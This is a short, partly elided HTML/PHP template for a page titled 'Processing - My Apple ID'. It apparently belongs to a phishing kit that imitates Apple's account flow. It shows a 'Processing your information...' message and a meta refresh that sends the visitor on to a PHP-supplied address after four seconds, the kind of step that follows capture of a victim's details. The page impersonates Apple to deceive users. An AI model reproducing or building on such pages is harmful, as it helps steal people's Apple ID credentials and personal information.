...
<META HTTP-EQUIV="Refresh" CONTENT="4;URL=<?php echo $indexs; ?>">


	

<title>Processing  - My Apple ID</title>
<meta charset="utf-8" />
...
<!--[if gte IE 9]><!-->
<link rel="stylesheet" href="base/css/base.css?style_session=<?php echo $indexs; ?>" media="screen, print" />
<!--<![endif]-->
	...
	<div id="container">
		<div id="interim-body" class="blue-header-popup">
			...
			<div class="content clearfix">
				<p class="single-message"><span>Processing your information...</span></p>
			</div>
